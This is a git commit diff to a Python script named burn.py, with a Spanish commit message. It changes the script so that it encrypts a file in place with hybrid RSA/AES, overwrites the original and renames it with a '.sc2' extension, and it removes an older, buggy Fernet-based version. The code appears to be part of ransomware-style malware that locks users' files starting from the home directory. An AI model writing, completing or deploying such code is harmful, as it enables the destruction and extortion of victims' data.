06d9d0d91be236ce49b6a89d088f052303664c3e
Klithik <santi17461@gmail.com>
2024-02-13 13:32:43 -0300

    ajustado para que en lugar de crear un archivo nuevo encriptado, sobreescriba el ya existente

--- burn.py
+++ burn.py
@@ -1,30 +1,10 @@
-from cryptography.fernet import Fernet
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 import os
 
 ruta_inicio = os.path.expanduser("~")
-ruta = os.path.join(ruta_inicio,"key.key")
 
-# =====================================OLD=================================
-# EL USO DE FERNET GENERA UNA ENTROPIA DEMASIADO BAJA
-def old_encrypt(f):
-    # GENERA UN LLAVE Y LA GUARDA EN EL ARCHIVO KEY.KEY
-    key = Fernet.generate_key()
-    with open(ruta,'rb') as filekey:
-        filekey.write(key)
-    # ENCRIPTA EL ARCHIVO CON LA LLAVE GENERADA
-    fer = Fernet(key)
-    with open(f,'wb') as file:
-        original = file.read()
-        file.close()
-    with open(f,'wb') as file:
-        file.write(fer.encrypt(original))
-
-def replace_file(file):
-    os.rename(file,file+'.sc2')
-# ======================================OLD==================================
 def encrypt(f):
     with open(f,"rb") as file:
         data = file.read()
@@ -38,12 +18,12 @@ def encrypt(f):
     cipher_aes = AES.new(session_key, AES.MODE_EAX)
     ciphertext, tag = cipher_aes.encrypt_and_digest(data)
     
-    with open(f+".sc2", "wb") as file:
+    with open(f, "wb") as file:
         file.write(enc_session_key)
         file.write(cipher_aes.nonce)
         file.write(tag)
         file.write(ciphertext)
-    os.remove(f)
+    os.rename(f,f+'.sc2')
 
 def main(file):
     encrypt(file)
